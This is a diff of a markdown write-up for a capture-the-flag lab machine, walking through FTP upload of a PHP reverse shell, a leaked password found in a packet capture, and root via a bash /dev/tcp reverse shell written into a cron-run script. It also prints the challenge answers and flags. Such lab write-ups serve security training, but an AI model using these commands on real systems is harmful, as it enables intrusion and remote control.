@@ -6,26 +6,26 @@
 
 <div align="center"> <img alt="Difficulty: Easy" src="https://img.shields.io/badge/Difficulty-Easy-brightgreen" /> <img alt="OS: Linux" src="https://img.shields.io/badge/OS-Linux-blue" /> </div>
 
-## Task 1
+### Task 1
 Welcome to Spice Hut!
 Start Machine
 We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!
 
-## What is the secret spicy soup recipe?
+### What is the secret spicy soup recipe?
 ```
 love
 ```
-## What are the contents of user.txt?
+### What are the contents of user.txt?
 
 ```
 THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
 ```
-## What are the contents of root.txt?
+### What are the contents of root.txt?
 ```
 THM{f963aaa6a430f210222158ae15c3d76d}
 ```
 
-# Enumeration
+## Enumeration
 Let start with Nmap scan to find running services.
 ```
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-28 20:50 IST
@@ -64,13 +64,13 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 31.41 seconds
 ```
-## Here, We can see that there are 3 open ports:
+### Here, We can see that there are 3 open ports:
 * ### 1. FTP on port 21.
 * ### 2. SSH on port 22.
 * ### 3. HTTP on port 80.
 
 
-## Ftp have ```anonymous``` login allowed let take a look at it.
+### Ftp have ```anonymous``` login allowed let take a look at it.
 ```
 death@esther:~$ ftp 10.10.231.18  
 Connected to 10.10.231.18.
@@ -93,7 +93,7 @@ drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
 226 Directory send OK.
 ftp> 
 ```
-### Let download this files
+#### Let download this files
 ```
 ftp> get important.jpg
 local: important.jpg remote: important.jpg
@@ -133,17 +133,17 @@ drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
 226 Directory send OK.
 ftp> 
 ```
-## Let read the notice.txt
+### Let read the notice.txt
 ```
 death@esther:~$ cat notice.txt 
 Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
 ```
-## Let see test.log
+### Let see test.log
 ```
 death@esther:~$ cat .test.log 
 test
 ```
-## I try to steghide for the image but
+### I try to steghide for the image but
 
 <div align="center">
   <img src="https://github.com/user-attachments/assets/cdb936a6-f30c-4772-ac07-05a68d38c6e9" height="250"></img>
@@ -154,13 +154,13 @@ death@esther:~$ steghide --extract -sf important.jpg
 Enter passphrase: 
 steghide: the file format of the file "important.jpg" is not supported.
 ```
-## As HTTP i open let nevigate to webiste
+### As HTTP i open let nevigate to webiste
 
 <div align="center">
   <img src="https://github.com/user-attachments/assets/9f681956-a97c-4a56-89dc-3bea1e499709" height="300"></img>
 </div>
 
-# Enumerating Web-directories
+## Enumerating Web-directories
 ```
 death@esther:~$ dirsearch -u 10.10.231.18
 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
@@ -201,13 +201,13 @@ Target: http://10.10.231.18/
 
 Task Completed
 ```
-## There is directory called files let take a look.
+### There is directory called files let take a look.
 
 <div align="center">
   <img src="https://github.com/user-attachments/assets/11198d1b-640a-45bd-979b-3ef9d9a2538b" height="300"></img>
 </div>
 
-## Its as we saw in FTP so maybe we can add file form ftp to this directory so let upload a reverse shell here.
+### Its as we saw in FTP so maybe we can add file form ftp to this directory so let upload a reverse shell here.
 ```
 <?php
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
@@ -251,11 +251,11 @@ ftp>
 ```
 nc -lnvp 1234
 ```
-## Start The shell
+### Start The shell
 ```
 curl http://10.10.231.18/files/ftp/shell.php
 ```
-## Here we go !!!
+### Here we go !!!
 ```
 death@esther:~$ nc -lnvp 1234
 Listening on 0.0.0.0 1234
@@ -267,11 +267,11 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 $ 
 ```
-## Swape shell
+### Swape shell
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
-## Here i found a recepie.txt
+### Here i found a recepie.txt
 ```
 www-data@startup:/$ ls -la
 ls -la
@@ -311,9 +311,9 @@ cat recipe.txt
 Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
 www-data@startup:/$ 
 ```
-### the secret spicy soup recipe is ```love```
+#### the secret spicy soup recipe is ```love```
 
-## As we have permission to let view incidents directory
+### As we have permission to let view incidents directory
 ```
 www-data@startup:/$ cd incidents
 cd incidents
@@ -325,10 +325,10 @@ drwxr-xr-x 25 root     root      4096 Oct  1 21:59 ..
 -rwxr-xr-x  1 www-data www-data 31224 Nov 12  2020 suspicious.pcapng
 www-data@startup:/incidents$ 
 ```
-### Here is a pcap-ng file let download it to our own system
+#### Here is a pcap-ng file let download it to our own system
 
-## My machine got expired here is new ip=10.10.15.177
-## Opening python server 
+### My machine got expired here is new ip=10.10.15.177
+### Opening python server 
 ```
 python3 -m http.server
 ```
@@ -353,7 +353,7 @@ suspicious.pcapng                               100%[===========================
 
 2024-10-02 04:07:38 (191 KB/s) - ‘suspicious.pcapng’ saved [31224/31224]
 ```
-## Open pcap-ng file in wireshark
+### Open pcap-ng file in wireshark
 ```
 wireshark -r suspicious.pcapng
 ```
@@ -361,7 +361,7 @@ wireshark -r suspicious.pcapng
   <img src="https://github.com/user-attachments/assets/0f3ec9e6-57b8-4813-88de-b0e89033a6e1" height="400"></img>
 </div>
 
-## Let just filter for date
+### Let just filter for date
 ```
 data
 ```
@@ -370,7 +370,7 @@ data
   <img src="https://github.com/user-attachments/assets/1bba16b9-5b9c-4aaf-a4e0-70438d39c929" height="400"></img>
 </div>
 
-## Let See first one let follow Tcp stream
+### Let See first one let follow Tcp stream
 
 <div align="center">
   <img src="https://github.com/user-attachments/assets/5c22e71a-6049-4e88-a041-0001c38afb94" height="400"></img>
@@ -524,11 +524,11 @@ exit
 $ exit
 
 ```
-## Now we have sudo password for lennie
+### Now we have sudo password for lennie
 ``` 
 c4ntg3t3n0ughsp1c3
 ```
-## Let loggin as lennie
+### Let loggin as lennie
 ```
  su lennie
 ```
@@ -539,24 +539,24 @@ Password: c4ntg3t3n0ughsp1c3
 
 lennie@startup:/$ 
 ```
-# User flag
+## User flag
 ```
 cat user.txt
 THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
 ```
-## Let loggin using ssh bez it much comfortable.
+### Let loggin using ssh bez it much comfortable.
 ```
 ssh lennie@10.10.15.177
 ```
-## As this system is using sh shell let use bash
+### As this system is using sh shell let use bash
 ```
 bash
 ```
-# Now that good
+## Now that good
 ```
 lennie@startup:~$
 ```
-## Here is a directory called scripts
+### Here is a directory called scripts
 ```
 lennie@startup:~$ ls -la
 total 24
@@ -568,11 +568,11 @@ drwxr-xr-x 2 root   root   4096 Nov 12  2020 scripts
 -rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
 lennie@startup:~$ 
 ```
-## Let see scripts
+### Let see scripts
 ```
 cd scripts/
 ```
-## here are 2 files
+### here are 2 files
 ```
 lennie@startup:~/scripts$ ls -la
 total 16
@@ -582,19 +582,19 @@ drwx------ 5 lennie lennie 4096 Oct  1 23:22 ..
 -rw-r--r-- 1 root   root      1 Oct  1 23:23 startup_list.txt
 lennie@startup:~/scripts$
 ```
-## Let read both
+### Let read both
 ```
 lennie@startup:~/scripts$ cat planner.sh 
 #!/bin/bash
 echo $LIST > /home/lennie/scripts/startup_list.txt
 /etc/print.sh
 ```
-### We dont have permission to run this script
-## Let view startup_list.txt
+#### We dont have permission to run this script
+### Let view startup_list.txt
 ```
 lennie@startup:~/scripts$ cat startup_list.txt 
 ```
-## Let take a look at /etc/print.sh
+### Let take a look at /etc/print.sh
 ```
 cat /etc/print.sh
 ```
@@ -605,45 +605,45 @@ lennie@startup:~/scripts$ cat /etc/print.sh
 #!/bin/bash
 echo "Done!"
 ```
-## Nothing much and as usual no permission 
+### Nothing much and as usual no permission 
 
-## As i Notice something odd that the startup_list.txt file is being updated every minute so I used watch to see
+### As i Notice something odd that the startup_list.txt file is being updated every minute so I used watch to see
 ```
  watch ls -la startup_list.txt
 ```
-## The script is running ever minute
+### The script is running ever minute
 
-## Let add something to print.sh file to reverify.
+### Let add something to print.sh file to reverify.
 
 	
 <div align="center">
   <img src="https://github.com/user-attachments/assets/dbd58442-3741-40cf-9494-89354c9b694e"></img>
 </div>
 
-## My file is created
+### My file is created
 
 <div align="center">
   <img src="https://github.com/user-attachments/assets/d600b530-978b-4b4f-ac74-43e7f81b3835"></img>
 </div>
 
-## Let add a reverse shell so we get root
+### Let add a reverse shell so we get root
 ```
 nano /etc/print.sh
 ```
 ```
 bash -i >& /dev/tcp/YOUR-IP/1234 0>&1
 ```
-## Open netcat in our system
+### Open netcat in our system
 ```
 nc -lnvp 1234
 ```
-### Wait for connection 
+#### Wait for connection 
 
 <div align="center">
   <img src="https://github.com/user-attachments/assets/fa454e44-bdeb-45f3-8238-ca56c2ab4054"></img>
 </div>
 
-## ROOT flag
+### ROOT flag
 ```
 cat /root/root.txt
 ```
